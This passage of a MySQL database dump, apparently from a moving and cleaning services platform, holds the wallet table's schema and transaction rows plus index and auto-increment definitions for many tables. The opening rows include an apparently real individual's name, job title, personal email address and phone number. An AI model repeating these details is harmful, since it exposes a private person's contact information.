(51, 106, 'Zana Mukadam', 'CEO', 'suhaanmukadam16@gmail.com', '0585200722'),
(53, 107, 'test', 'test', 'admin@gmail.com', '2325698745');

-- --------------------------------------------------------

--
-- Table structure for table `wallets`
--

CREATE TABLE `wallets` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `vendors_id` int(11) NOT NULL,
  `price` int(11) NOT NULL,
  `payment` int(11) NOT NULL COMMENT '0-cash,1-online',
  `add_deduct` int(11) DEFAULT NULL COMMENT '0-add,1-deduct',
  `status` int(11) NOT NULL COMMENT '0-not approve,1-approv\r\n',
  `subscription_id` bigint(20) NOT NULL DEFAULT '0',
  `payment_id` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `payment_status` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  `updated_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `wallets`
--

INSERT INTO `wallets` (`id`, `vendors_id`, `price`, `payment`, `add_deduct`, `status`, `subscription_id`, `payment_id`, `payment_status`, `created_at`, `updated_at`) VALUES
(10, 66, 1500, 0, 1, 0, 8, NULL, NULL, '2023-12-09 05:57:01', '2023-12-09 05:57:01'),
(12, 48, 1500, 0, 0, 0, 0, NULL, NULL, '2023-12-09 01:13:39', '2023-12-09 01:13:39'),
(13, 48, 2500, 1, 0, 1, 0, NULL, NULL, '2023-12-09 01:13:50', '2023-12-09 01:13:50'),
(14, 48, 3500, 1, 0, 1, 0, NULL, NULL, '2023-12-09 01:14:00', '2023-12-09 01:14:00'),
(15, 48, 2700, 0, 1, 0, 10, NULL, NULL, '2023-12-09 06:44:51', '2023-12-09 06:44:51'),
(16, 67, 1200, 0, 1, 0, 11, NULL, NULL, '2023-12-09 07:16:29', '2023-12-09 07:16:29'),
(17, 66, 1200, 0, 1, 0, 12, NULL, NULL, '2023-12-09 08:27:32', '2023-12-09 08:27:32'),
(18, 66, 1200, 0, 1, 0, 13, NULL, NULL, '2023-12-09 08:29:08', '2023-12-09 08:29:08'),
(19, 66, 1500, 0, 1, 0, 14, NULL, NULL, '2023-12-09 08:31:34', '2023-12-09 08:31:34'),
(20, 66, 1500, 0, 1, 0, 15, NULL, NULL, '2023-12-09 08:34:24', '2023-12-09 08:34:24'),
(21, 48, 1700, 0, 1, 0, 16, NULL, NULL, '2023-12-09 11:51:52', '2023-12-09 11:51:52'),
(22, 48, 1500, 0, 0, 1, 0, NULL, NULL, '2023-12-09 06:24:17', '2023-12-09 06:24:17'),
(23, 48, 500, 1, 0, 1, 0, NULL, NULL, '2023-12-09 06:25:01', '2023-12-09 06:25:01'),
(26, 49, 1500, 0, 0, 1, 0, NULL, NULL, '2023-12-10 23:37:09', '2023-12-10 23:37:09'),
(27, 49, 2500, 1, 0, 1, 0, NULL, NULL, '2023-12-10 23:37:26', '2023-12-10 23:37:26'),
(28, 49, 3500, 1, 0, 1, 0, NULL, NULL, '2023-12-10 23:37:33', '2023-12-10 23:37:33'),
(29, 49, 1200, 0, 1, 0, 18, NULL, NULL, '2023-12-11 05:09:50', '2023-12-11 05:09:50'),
(30, 49, 1700, 0, 1, 0, 19, NULL, NULL, '2023-12-11 05:11:47', '2023-12-11 05:11:47'),
(31, 66, 500, 0, 1, 0, 20, NULL, NULL, '2023-12-15 11:42:04', '2023-12-15 11:42:04'),
(32, 68, 5000, 1, 0, 1, 0, NULL, NULL, '2023-12-21 23:21:41', '2023-12-21 23:21:41'),
(33, 67, 5000, 1, 0, 1, 0, NULL, NULL, '2023-12-21 23:23:30', '2023-12-21 23:23:30'),
(34, 67, 1200, 0, 1, 0, 21, NULL, NULL, '2023-12-22 04:54:35', '2023-12-22 04:54:35'),
(35, 67, 500, 0, 1, 0, 22, NULL, NULL, '2023-12-22 04:54:48', '2023-12-22 04:54:48'),
(36, 68, 1200, 0, 1, 0, 23, NULL, NULL, '2023-12-22 04:55:14', '2023-12-22 04:55:14'),
(37, 68, 500, 0, 1, 0, 24, NULL, NULL, '2023-12-22 04:55:34', '2023-12-22 04:55:34'),
(38, 69, 5000, 0, 0, 0, 0, NULL, NULL, '2023-12-22 00:20:50', '2023-12-22 00:20:50'),
(39, 69, 1700, 0, 1, 0, 25, NULL, NULL, '2023-12-22 05:52:45', '2023-12-22 05:52:45'),
(40, 64, 1000, 0, 0, 0, 0, NULL, NULL, '2023-12-24 01:14:56', '2023-12-24 01:14:56'),
(41, 64, 500, 0, 1, 0, 26, NULL, NULL, '2023-12-24 06:45:50', '2023-12-24 06:45:50'),
(42, 70, 15000, 0, 0, 0, 0, NULL, NULL, '2024-01-10 08:00:37', '2024-01-10 08:00:37'),
(43, 70, 1700, 0, 1, 0, 27, NULL, NULL, '2024-01-10 13:34:26', '2024-01-10 13:34:26'),
(44, 71, 15000, 0, 0, 0, 0, NULL, NULL, '2024-01-16 23:06:43', '2024-01-16 23:06:43'),
(45, 71, 150, 0, 1, 0, 28, NULL, NULL, '2024-01-17 04:37:55', '2024-01-17 04:37:55'),
(46, 72, 2000, 1, 0, 1, 0, NULL, NULL, '2024-02-26 01:04:16', '2024-02-26 01:04:16'),
(47, 73, 15000, 0, 0, 1, 0, NULL, NULL, '2024-03-02 01:18:30', '2024-03-02 01:18:30'),
(48, 73, 46, 0, 1, 0, 29, NULL, NULL, '2024-03-02 06:49:53', '2024-03-02 06:49:53'),
(49, 72, 3, 0, 1, 0, 30, NULL, NULL, '2024-03-03 06:51:05', '2024-03-03 06:51:05'),
(50, 73, 1500, 0, 1, 0, 31, NULL, NULL, '2024-03-16 07:14:52', '2024-03-16 07:14:52'),
(51, 72, 5, 0, 1, 0, 32, NULL, NULL, '2024-03-16 08:14:25', '2024-03-16 08:14:25'),
(52, 73, 1, 0, 1, 0, 33, NULL, NULL, '2024-03-16 09:52:12', '2024-03-16 09:52:12'),
(53, 73, 2, 0, 1, 0, 34, NULL, NULL, '2024-03-18 05:07:15', '2024-03-18 05:07:15'),
(54, 73, 2, 0, 1, 0, 35, NULL, NULL, '2024-03-18 05:09:28', '2024-03-18 05:09:28'),
(55, 73, 100, 0, 1, 0, 36, NULL, NULL, '2024-03-18 05:10:22', '2024-03-18 05:10:22'),
(56, 73, 1500, 0, 1, 0, 37, NULL, NULL, '2024-03-22 11:50:14', '2024-03-22 11:50:14'),
(57, 73, 100, 0, 0, 0, 0, NULL, NULL, '2024-03-30 00:07:23', '2024-03-30 00:07:23'),
(58, 73, 105, 1, 0, 0, 0, NULL, 'Fail', '2024-03-30 01:36:18', '2024-03-30 01:36:18'),
(59, 73, 150, 1, 0, 0, 0, NULL, 'Fail', '2024-03-30 01:37:43', '2024-03-30 01:37:43'),
(60, 73, 1024, 1, 0, 0, 0, 'cs_test_a1roOy2sWbj3yAZYEFknhk8dTBCupckNmJ5megVTjlMtiSATH1c03JZjk8', 'Success', '2024-03-30 01:43:32', '2024-03-30 01:43:32'),
(61, 73, 200, 1, 0, 1, 0, 'cs_test_a1UYO1fGGBh0zXSKoc40EGWtfv97mDoHz4UnQjMLFG13iZMUCsGmiJvViE', 'Success', '2024-03-30 01:46:55', '2024-03-30 01:46:55'),
(62, 73, 222, 1, 0, 0, 0, NULL, 'Fail', '2024-03-30 01:51:51', '2024-03-30 01:51:51'),
(63, 73, 2222, 1, 0, 1, 0, 'cs_test_a1GCXidsRLX8fMkKYFqo8Ttpk7exiZL5LpX9NMFHOWeQmlMSkV2IUe6wD3', 'Success', '2024-03-30 01:52:25', '2024-03-30 01:52:25'),
(64, 73, 100, 1, 0, 1, 0, 'cs_test_a1Jl7goTiPDOslX4X2ssosBp8RoWXqWARFFY5gAh6REHFaXxqxayRZYL6D', 'Success', '2024-03-30 01:58:36', '2024-03-30 01:58:36'),
(65, 73, 51, 1, 0, 1, 0, 'cs_test_a1kMkuvH70d5a6vc9NOBk3hFGpmhIVpFWamU0PqmInRVApOeSJRsWRtSMz', 'Success', '2024-03-30 02:09:18', '2024-03-30 02:09:18'),
(66, 73, 100, 1, 0, 1, 0, 'cs_test_a1rPpt5swJl7xBkq9LbkzXPlnJeFPiI1mDriEXQSnl7IFBFoSqAXyQPkg2', 'Success', '2024-03-30 02:15:01', '2024-03-30 02:15:01'),
(67, 74, 50000, 0, 0, 1, 0, NULL, 'Success', '2024-04-27 00:23:23', '2024-04-27 00:23:23'),
(68, 74, 1, 0, 1, 0, 38, NULL, NULL, '2024-04-27 06:16:56', '2024-04-27 06:16:56'),
(69, 73, 1, 0, 1, 0, 39, NULL, NULL, '2024-04-27 06:37:48', '2024-04-27 06:37:48'),
(70, 74, 10, 1, 0, 0, 0, NULL, 'Fail', '2024-04-27 04:42:41', '2024-04-27 04:42:41'),
(71, 75, 5000, 0, 0, 1, 0, NULL, 'Success', '2024-04-29 04:20:34', '2024-04-29 04:20:34'),
(72, 75, 1, 0, 1, 0, 40, NULL, NULL, '2024-04-29 09:53:10', '2024-04-29 09:53:10'),
(73, 75, 150, 0, 1, 0, 41, NULL, NULL, '2024-04-29 10:43:46', '2024-04-29 10:43:46'),
(74, 75, 1, 0, 1, 0, 42, NULL, NULL, '2024-04-29 10:55:12', '2024-04-29 10:55:12'),
(75, 75, 1, 0, 1, 0, 43, NULL, NULL, '2024-04-29 11:00:39', '2024-04-29 11:00:39'),
(76, 75, 1, 0, 1, 0, 44, NULL, NULL, '2024-04-29 11:10:18', '2024-04-29 11:10:18'),
(77, 75, 1, 0, 1, 0, 45, NULL, NULL, '2024-05-01 11:30:32', '2024-05-01 11:30:32'),
(78, 78, 100, 0, 0, 1, 0, NULL, 'Success', '2024-05-18 00:17:55', '2024-05-18 00:17:55'),
(79, 78, 1, 1, 0, 0, 0, NULL, 'Fail', '2024-05-18 00:18:06', '2024-05-18 00:18:06'),
(80, 78, 1, 1, 0, 0, 0, NULL, 'Fail', '2024-05-18 00:18:52', '2024-05-18 00:18:52'),
(81, 78, 2, 1, 0, 0, 0, NULL, 'Fail', '2024-05-18 00:19:17', '2024-05-18 00:19:17'),
(82, 78, 2, 0, 1, 0, 46, NULL, NULL, '2024-05-18 05:53:47', '2024-05-18 05:53:47'),
(83, 77, 500, 0, 0, 1, 0, NULL, 'Success', '2024-05-18 00:25:14', '2024-05-18 00:25:14'),
(84, 77, 100, 0, 1, 0, 47, NULL, NULL, '2024-05-18 05:58:52', '2024-05-18 05:58:52'),
(85, 77, 2, 0, 1, 0, 48, NULL, NULL, '2024-05-18 05:59:15', '2024-05-18 05:59:15'),
(86, 78, 1, 0, 1, 0, 49, NULL, NULL, '2024-05-18 06:12:01', '2024-05-18 06:12:01'),
(87, 79, 100, 0, 0, 1, 0, NULL, 'Success', '2024-05-18 05:40:06', '2024-05-18 05:40:06'),
(88, 79, 2, 1, 0, 0, 0, NULL, 'Fail', '2024-05-18 05:40:34', '2024-05-18 05:40:34'),
(89, 79, 44, 0, 1, 0, 50, NULL, NULL, '2024-05-18 11:12:22', '2024-05-18 11:12:22'),
(90, 73, 270, 0, 1, 0, 51, NULL, NULL, '2024-05-21 11:57:44', '2024-05-21 11:57:44'),
(91, 73, 60, 0, 1, 0, 52, NULL, NULL, '2024-05-22 11:26:50', '2024-05-22 11:26:50'),
(92, 90, 945, 1, 0, 0, 0, NULL, 'Fail', '2024-05-23 02:39:48', '2024-05-23 02:39:48'),
(93, 75, 1, 0, 1, 0, 53, NULL, NULL, '2024-05-29 11:07:44', '2024-05-29 11:07:44'),
(94, 98, 100, 0, 1, 0, 54, NULL, NULL, '2024-05-29 19:46:16', '2024-05-29 19:46:16'),
(95, 98, 300, 0, 1, 0, 55, NULL, NULL, '2024-05-29 19:47:18', '2024-05-29 19:47:18'),
(96, 73, 25, 0, 1, 0, 56, NULL, NULL, '2024-06-04 14:02:30', '2024-06-04 14:02:30'),
(97, 73, 640, 0, 1, 0, 57, NULL, NULL, '2024-06-04 14:03:10', '2024-06-04 14:03:10'),
(98, 77, 151, 0, 1, 0, 58, NULL, NULL, '2024-06-05 12:19:26', '2024-06-05 12:19:26'),
(99, 91, 10000, 0, 0, 1, 58, NULL, NULL, '2024-06-05 12:19:26', '2024-06-05 12:19:26'),
(100, 91, 1435, 0, 1, 0, 59, NULL, NULL, '2024-06-06 12:44:16', '2024-06-06 12:44:16'),
(101, 106, 1000, 1, 0, 0, 0, NULL, 'Fail', '2024-06-15 07:32:27', '2024-06-15 07:32:27'),
(102, 106, 1000, 1, 0, 0, 0, NULL, 'Fail', '2024-06-15 07:33:57', '2024-06-15 07:33:57'),
(103, 106, 1000, 0, 0, 1, 0, NULL, 'Success', '2024-06-15 07:35:15', '2024-06-15 07:35:15'),
(104, 106, 25, 0, 1, 0, 60, NULL, NULL, '2024-06-15 14:02:34', '2024-06-15 14:02:34'),
(105, 106, 150, 0, 0, 0, 0, NULL, 'Success', '2024-06-15 10:56:55', '2024-06-15 10:56:55'),
(106, 73, 1800, 0, 0, 0, 0, NULL, 'Success', '2024-06-20 01:04:14', '2024-06-20 01:04:14'),
(107, 75, 56, 0, 0, 1, 0, NULL, 'Success', '2024-06-20 01:50:29', '2024-06-20 01:50:29'),
(108, 73, 100, 0, 1, 0, 61, NULL, NULL, '2024-06-20 09:37:03', '2024-06-20 09:37:03'),
(109, 73, 100, 0, 1, 0, 62, NULL, NULL, '2024-06-20 10:27:59', '2024-06-20 10:27:59'),
(110, 73, 100, 0, 1, 0, 63, NULL, NULL, '2024-06-20 10:29:20', '2024-06-20 10:29:20'),
(111, 73, 100, 1, 0, 0, 0, NULL, 'Fail', '2024-06-22 03:34:13', '2024-06-22 03:34:13'),
(112, 73, 100, 1, 0, 0, 0, NULL, 'Fail', '2024-06-22 03:34:53', '2024-06-22 03:34:53'),
(113, 73, 5000, 0, 1, 0, 64, NULL, NULL, '2024-06-22 11:05:31', '2024-06-22 11:05:31');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `blogs`
--
ALTER TABLE `blogs`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `blog_category`
--
ALTER TABLE `blog_category`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `cities`
--
ALTER TABLE `cities`
  ADD PRIMARY KEY (`id`),
  ADD KEY `country` (`country`),
  ADD KEY `state` (`state`);

--
-- Indexes for table `ci_orders`
--
ALTER TABLE `ci_orders`
  ADD PRIMARY KEY (`order_id`);

--
-- Indexes for table `ci_order_item`
--
ALTER TABLE `ci_order_item`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `ci_order_item_packages`
--
ALTER TABLE `ci_order_item_packages`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `ci_shipping_address`
--
ALTER TABLE `ci_shipping_address`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `cleanin_subserviceprice`
--
ALTER TABLE `cleanin_subserviceprice`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `cms`
--
ALTER TABLE `cms`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `contact_us`
--
ALTER TABLE `contact_us`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `countries`
--
ALTER TABLE `countries`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `faqs`
--
ALTER TABLE `faqs`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `form_attributes`
--
ALTER TABLE `form_attributes`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `form_fileds`
--
ALTER TABLE `form_fileds`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `frontloginregisters`
--
ALTER TABLE `frontloginregisters`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `front_user_wallet`
--
ALTER TABLE `front_user_wallet`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `googlereviews`
--
ALTER TABLE `googlereviews`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `leads`
--
ALTER TABLE `leads`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `more_formfields_details`
--
ALTER TABLE `more_formfields_details`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `more_formfields_details_att`
--
ALTER TABLE `more_formfields_details_att`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `more_form_attributes`
--
ALTER TABLE `more_form_attributes`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `packages`
--
ALTER TABLE `packages`
  ADD PRIMARY KEY (`id`),
  ADD KEY `discount_type` (`discount_type`),
  ADD KEY `set_order` (`set_order`),
  ADD KEY `service_id` (`service_id`),
  ADD KEY `subservice_id` (`subservice_id`),
  ADD KEY `packagecategory_id` (`packagecategory_id`);

--
-- Indexes for table `packages_enquiry`
--
ALTER TABLE `packages_enquiry`
  ADD PRIMARY KEY (`id`),
  ADD KEY `pakage_id` (`pakage_id`),
  ADD KEY `service_id` (`service_id`),
  ADD KEY `subservice_id` (`subservice_id`),
  ADD KEY `packagecategory_id` (`packagecategory_id`),
  ADD KEY `accept_vendor_id` (`accept_vendor_id`),
  ADD KEY `is_accept` (`is_accept`);

--
-- Indexes for table `packages_excluser`
--
ALTER TABLE `packages_excluser`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `packages_image`
--
ALTER TABLE `packages_image`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `packages_incluser`
--
ALTER TABLE `packages_incluser`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `packages_others`
--
ALTER TABLE `packages_others`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `package_attr`
--
ALTER TABLE `package_attr`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `package_categories`
--
ALTER TABLE `package_categories`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `package_inquiry_accepted`
--
ALTER TABLE `package_inquiry_accepted`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `password_resets`
--
ALTER TABLE `password_resets`
  ADD KEY `password_resets_email_index` (`email`);

--
-- Indexes for table `permissions`
--
ALTER TABLE `permissions`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `personal_access_tokens`
--
ALTER TABLE `personal_access_tokens`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `personal_access_tokens_token_unique` (`token`),
  ADD KEY `personal_access_tokens_tokenable_type_tokenable_id_index` (`tokenable_type`,`tokenable_id`);

--
-- Indexes for table `prices`
--
ALTER TABLE `prices`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `qoute_includes`
--
ALTER TABLE `qoute_includes`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `reject_enquiry`
--
ALTER TABLE `reject_enquiry`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `services`
--
ALTER TABLE `services`
  ADD PRIMARY KEY (`id`),
  ADD KEY `set_order` (`set_order`),
  ADD KEY `is_active` (`is_active`);

--
-- Indexes for table `service_quote_includes`
--
ALTER TABLE `service_quote_includes`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `states`
--
ALTER TABLE `states`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `subscribes`
--
ALTER TABLE `subscribes`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `subscription`
--
ALTER TABLE `subscription`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `subscription_international_move_attribute`
--
ALTER TABLE `subscription_international_move_attribute`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `subscription_local_move_attribute`
--
ALTER TABLE `subscription_local_move_attribute`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `subscription_subservice_attribute`
--
ALTER TABLE `subscription_subservice_attribute`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `subservices`
--
ALTER TABLE `subservices`
  ADD PRIMARY KEY (`id`),
  ADD KEY `serviceid` (`serviceid`),
  ADD KEY `set_order` (`set_order`);

--
-- Indexes for table `subservice_attr`
--
ALTER TABLE `subservice_attr`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `system`
--
ALTER TABLE `system`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `users_email_unique` (`email`);

--
-- Indexes for table `user_permissions`
--
ALTER TABLE `user_permissions`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `vendors_attribute`
--
ALTER TABLE `vendors_attribute`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `wallets`
--
ALTER TABLE `wallets`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `blogs`
--
ALTER TABLE `blogs`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT for table `blog_category`
--
ALTER TABLE `blog_category`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `cities`
--
ALTER TABLE `cities`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=27;

--
-- AUTO_INCREMENT for table `ci_orders`
--
ALTER TABLE `ci_orders`
  MODIFY `order_id` bigint(20) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=95;

--
-- AUTO_INCREMENT for table `ci_order_item`
--
ALTER TABLE `ci_order_item`
  MODIFY `id` bigint(20) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=105;

--
-- AUTO_INCREMENT for table `ci_order_item_packages`
--
ALTER TABLE `ci_order_item_packages`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT for table `ci_shipping_address`
--
ALTER TABLE `ci_shipping_address`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=93;

--
-- AUTO_INCREMENT for table `cleanin_subserviceprice`
--
ALTER TABLE `cleanin_subserviceprice`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `cms`
--
ALTER TABLE `cms`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT for table `contact_us`
--
ALTER TABLE `contact_us`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=65;

--
-- AUTO_INCREMENT for table `countries`
--
ALTER TABLE `countries`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=263;

--
-- AUTO_INCREMENT for table `faqs`
--
ALTER TABLE `faqs`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT for table `form_attributes`
--
ALTER TABLE `form_attributes`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=663;

--
-- AUTO_INCREMENT for table `form_fileds`
--
ALTER TABLE `form_fileds`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=67;

--
-- AUTO_INCREMENT for table `frontloginregisters`
--
ALTER TABLE `frontloginregisters`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=38;

--
-- AUTO_INCREMENT for table `front_user_wallet`
--
ALTER TABLE `front_user_wallet`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=9;

--
-- AUTO_INCREMENT for table `googlereviews`
--
ALTER TABLE `googlereviews`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT for table `leads`
--
ALTER TABLE `leads`
  MODIFY `id` bigint(20) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `more_formfields_details`
--
ALTER TABLE `more_formfields_details`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2030;

--
-- AUTO_INCREMENT for table `more_formfields_details_att`
--
ALTER TABLE `more_formfields_details_att`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=94;

--
-- AUTO_INCREMENT for table `more_form_attributes`
--
ALTER TABLE `more_form_attributes`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=49;

--
-- AUTO_INCREMENT for table `packages`
--
ALTER TABLE `packages`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=56;

--
-- AUTO_INCREMENT for table `packages_enquiry`
--
ALTER TABLE `packages_enquiry`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=256;

--
-- AUTO_INCREMENT for table `packages_excluser`
--
ALTER TABLE `packages_excluser`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=99;

--
-- AUTO_INCREMENT for table `packages_image`
--
ALTER TABLE `packages_image`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=26;

--
-- AUTO_INCREMENT for table `packages_incluser`
--
ALTER TABLE `packages_incluser`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=197;

--
-- AUTO_INCREMENT for table `packages_others`
--
ALTER TABLE `packages_others`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT for table `package_attr`
--
ALTER TABLE `package_attr`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=13;

--
-- AUTO_INCREMENT for table `package_categories`
--
ALTER TABLE `package_categories`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=23;

--
-- AUTO_INCREMENT for table `package_inquiry_accepted`
--
ALTER TABLE `package_inquiry_accepted`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=40;

--
-- AUTO_INCREMENT for table `permissions`
--
ALTER TABLE `permissions`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=26;

--
-- AUTO_INCREMENT for table `personal_access_tokens`
--
ALTER TABLE `personal_access_tokens`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `prices`
--
ALTER TABLE `prices`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `qoute_includes`
--
ALTER TABLE `qoute_includes`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=91;

--
-- AUTO_INCREMENT for table `reject_enquiry`
--
ALTER TABLE `reject_enquiry`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `services`
--
ALTER TABLE `services`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=47;

--
-- AUTO_INCREMENT for table `service_quote_includes`
--
ALTER TABLE `service_quote_includes`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=10;

--
-- AUTO_INCREMENT for table `states`
--
ALTER TABLE `states`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=31;

--
-- AUTO_INCREMENT for table `subscribes`
--
ALTER TABLE `subscribes`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=13;

--
-- AUTO_INCREMENT for table `subscription`
--
ALTER TABLE `subscription`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=65;

--
-- AUTO_INCREMENT for table `subscription_international_move_attribute`
--
ALTER TABLE `subscription_international_move_attribute`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=27;

--
-- AUTO_INCREMENT for table `subscription_local_move_attribute`
--
ALTER TABLE `subscription_local_move_attribute`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=27;

--
-- AUTO_INCREMENT for table `subscription_subservice_attribute`
--
ALTER TABLE `subscription_subservice_attribute`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=116;

--
-- AUTO_INCREMENT for table `subservices`
--
ALTER TABLE `subservices`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=72;

--
-- AUTO_INCREMENT for table `subservice_attr`
--
ALTER TABLE `subservice_attr`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=55;

--
-- AUTO_INCREMENT for table `system`
--
ALTER TABLE `system`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=109;

--
-- AUTO_INCREMENT for table `user_permissions`
--
ALTER TABLE `user_permissions`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=9;

--
-- AUTO_INCREMENT for table `vendors_attribute`
--
ALTER TABLE `vendors_attribute`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=54;

--
-- AUTO_INCREMENT for table `wallets`
--
ALTER TABLE `wallets`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=114;
COMMIT;

